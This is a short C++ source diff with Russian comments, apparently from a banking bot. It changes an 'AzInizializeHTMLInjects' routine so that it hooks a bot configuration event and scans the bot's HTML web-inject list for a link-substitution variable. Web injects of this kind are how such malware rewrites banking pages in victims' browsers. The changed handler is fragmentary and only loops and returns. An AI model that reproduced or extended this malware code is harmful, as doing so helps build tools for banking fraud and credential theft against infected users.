@@ -2,7 +2,8 @@
 #pragma hdrstop
 
 
-
+#include "BotDef.h"
+#include "BotConfig.h"
 #include "Modules.h"
 
 
@@ -110,18 +111,39 @@ void AzInicializeHostChecker()
 //-----------------------------------------------------------------------------
 
 
+void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
+{
+	THTMLInjectList* Injects = (THTMLInjectList*)Sender;
+
+	// Перебираем все инжекты в поисках инжектов  нужной переменной
+	TLock L = Injects->GetLocker();
+
+
+	int Count = Injects->Count();
+	for (int i = 0; i < Count; i++)
+	{
+		THTMLInject *Inject = Injects->Items(i);
+		if (Inject->ContainVariable(""))
+			return;
+
+	}
+}
+
+
+
 //----------------------------------------------------
 //  AzInizializeHTMLInjects  - Функция инициализирует
 //  систему подмены ссылок в HTML инжектах
 //----------------------------------------------------
-void AzInizializeHTMLInjects(const THTMLInjectList &Injects)
+void AzInizializeHTMLInjects()
 {
 	// перебираем инжекты и ищем в них вхождение параметра
-
-	int Count = Injects.Count();
-	for (int i = 0; i < Count; i++)
+	TBotConfig* Config = Config::GetConfig();
+	if (Config)
 	{
-        THTMLInject *Inject = Injects[i];
+		// Подключаемся к событию загрузки HTML инжектов
+		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
+		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
 	}
 }
 //-----------------------------------------------------------------------------
